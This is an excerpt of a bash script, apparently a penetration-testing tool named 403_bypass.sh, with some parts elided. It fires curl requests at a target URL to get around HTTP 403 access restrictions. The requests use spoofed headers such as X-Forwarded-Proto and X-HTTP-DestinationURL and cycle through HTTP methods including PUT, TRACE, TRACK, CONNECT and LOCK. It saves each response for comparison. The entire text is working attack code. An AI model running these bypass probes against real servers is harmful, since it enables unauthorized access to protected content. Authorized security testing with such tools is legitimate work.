#!/bin/bash
# ./403_bypass.sh -u http://127.0.0.1/ -o outdir
...
outdir="scan-$domain-$(date '+%Y-%m-%d-%T')"
...
echo curl --path-as-is -skg -o "$outdir/original.html" -w "Status: %{http_code}, Length: %{size_download}\n" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$outdir/original.html" -w "Status: %{http_code}, Length: %{size_download}\n" -X GET "$URL" -H "$user_agent")
print
...
echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Profile: http://$domain" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Profile: http://$domain" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Arbitrary http:// Payload:"
echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Arbitrary: http://$domain" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Arbitrary: http://$domain" -X GET "$URL" -H "$user_agent")
print
echo -n "X-HTTP-DestinationURL http:// Payload:"
echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-HTTP-DestinationURL: http://$domain" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-HTTP-DestinationURL: http://$domain" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Forwarded-Proto http:// Payload:"
echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Proto: http://$domain" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Proto: http://$domain" -X GET "$URL" -H "$user_agent")
print
...
echo -e ${blue}"----------------------"${end}
echo -n "GET : "
echo curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$outdir/$(date +%s).html" -H "$user_agent" -X GET
code=$(curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$outdir/$(date +%s).html" -H "$user_agent" -X GET)
print
echo -n "POST : "
echo curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$outdir/$(date +%s).html" -H "$user_agent" -X POST
code=$(curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$outdir/$(date +%s).html" -H "$user_agent" -X POST)
print
echo -n "HEAD :"
echo curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$outdir/$(date +%s).html" -I -H "$user_agent"
code=$(curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$outdir/$(date +%s).html" -I -H "$user_agent")
print
echo -n "OPTIONS : "
echo curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$outdir/$(date +%s).html" -H "$user_agent" -X OPTIONS
code=$(curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$outdir/$(date +%s).html" -H "$user_agent" -X OPTIONS)
print
echo -n "PUT : "
echo curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$outdir/$(date +%s).html" -H "$user_agent" -X PUT
code=$(curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$outdir/$(date +%s).html" -H "$user_agent" -X PUT)
print
echo -n "TRACE : "
echo curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$outdir/$(date +%s).html" -H "$user_agent" -X TRACE
code=$(curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$outdir/$(date +%s).html" -H "$user_agent" -X TRACE)
print
echo  -n "PATCH : "
echo curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$outdir/$(date +%s).html" -H "$user_agent" -X PATCH
code=$(curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$outdir/$(date +%s).html" -H "$user_agent" -X PATCH)
print
echo  -n "TRACK : "
echo curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$outdir/$(date +%s).html" -H "$user_agent" -X TRACK
code=$(curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$outdir/$(date +%s).html" -H "$user_agent" -X TRACK)
print
echo  -n "CONNECT : "
echo curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$outdir/$(date +%s).html" -H "$user_agent" -X CONNECT
code=$(curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$outdir/$(date +%s).html" -H "$user_agent" -X CONNECT)
print
echo  -n "UPDATE : "
echo curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$outdir/$(date +%s).html" -H "$user_agent" -X UPDATE
code=$(curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$outdir/$(date +%s).html" -H "$user_agent" -X UPDATE)
print
echo  -n "LOCK : "
echo curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$outdir/$(date +%s).html" -H "$user_agent" -X LOCK
code=$(curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$outdir/$(date +%s).html" -H "$user_agent" -X LOCK)
print
